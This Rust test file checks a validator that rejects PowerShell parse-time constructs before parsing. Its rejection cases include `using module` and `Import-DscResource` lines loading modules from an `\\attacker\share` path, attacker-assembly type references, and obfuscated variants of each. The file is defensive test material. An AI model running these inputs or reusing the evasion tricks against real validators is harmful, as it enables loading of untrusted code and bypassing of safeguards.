use super::requires_preparse_rejection;

#[test]
fn rejects_every_possible_parse_time_construct_before_semantic_parsing() {
    for source in [
        r"using module '\\attacker\share\Evil.psd1'",
        r"using module .\workspace\Evil.psd1",
        "UsInG <# formatting #>\n MoDuLe '\\\\attacker\\share\\Evil.psd1'",
        r"configuration CodexProbe { Import-DscResource -ModuleName '\\attacker\share\Evil.psd1' }",
        r"[DscLocalConfigurationManager()] CoNfIgUrAtIoN CodexProbe {
            ImPoRt-DsCrEsOuRcE -ModuleName '\\attacker\share\Evil.psd1'
        }",
        r"$value=1,using module '\\attacker\share\Evil.psd1'",
        r"$value[using module '\\attacker\share\Evil.psd1'",
        r"$value..configuration CodexProbe { Import-DscResource }",
        "$$using module Foo",
        "u`sing module Foo",
        "configura`tion CodexProbe {}",
        "Get-Content `\n Cargo.toml",
        "Write-Output x` #; configuration CodexProbe {}",
        "# using module Foo\nGet-Content Cargo.toml",
        "<# configuration CodexProbe {} #>\nGet-Content Cargo.toml",
        r"Write-Output 'using module Foo'",
        r#"Write-Output "configuration CodexProbe {}""#,
        r"Get-Content C:\configuration\using\file.txt",
        "[Codex.DoesNotExist, /tmp/Codex.AttackerAssembly]",
        "[Codex.DoesNotExist, //tmp/Codex.AttackerAssembly]",
        r"[Codex.DoesNotExist, C:\workspace\Codex.AttackerAssembly]",
        r"[Codex.DoesNotExist, \\attacker\share\Evil]",
        "[Codex.DoesNotExist, C:/workspace/Codex.AttackerAssembly]",
        "[Codex.DoesNotExist, //attacker/share/Evil]",
        "[Codex.DoesNotExist <# ] #>, /tmp/Codex.AttackerAssembly]",
        "[Codex.DoesNotExist\n,\n/tmp/Codex.AttackerAssembly]",
        "[System.Collections.Generic.Dictionary[string, Codex.DoesNotExist]]",
        "[System.Collections.Generic.List[[Codex.DoesNotExist, /tmp/Codex.AttackerAssembly]]]",
        "[Codex.DoesNotExistAttribute, Codex.AttackerAssembly()] class C {}",
        "[Codex.DoesNotExistAttribute <# ] #>, /tmp/Codex.AttackerAssembly()] class C {}",
        "Write-Output '[not a type]'; Write-Output a,b",
        "# [ inert\nWrite-Output a,b",
    ] {
        assert!(requires_preparse_rejection(source), "accepted {source:?}");
    }
}

#[test]
fn allows_sources_without_raw_semantic_keywords() {
    for source in [
        "# ordinary comment\nGet-Content Cargo.toml",
        r#"Write-Output "ordinary string""#,
        r#"confi"guration" CodexProbe {}"#,
        "u'sing' module Foo",
        "#Requires -Modules C:\\workspace\\CodexProbe.psm1\nGet-Content Cargo.toml",
        "[System.String]::Empty",
        "$items[0]",
        "Write-Output 1,2; [System.String]::Empty",
        "Write-Output '[not a type]'",
        "[Codex.DoesNotExist， /tmp/Codex.AttackerAssembly]",
        "[Codex.DoesNotExist، /tmp/Codex.AttackerAssembly]",
    ] {
        assert!(!requires_preparse_rejection(source), "rejected {source:?}");
    }
}
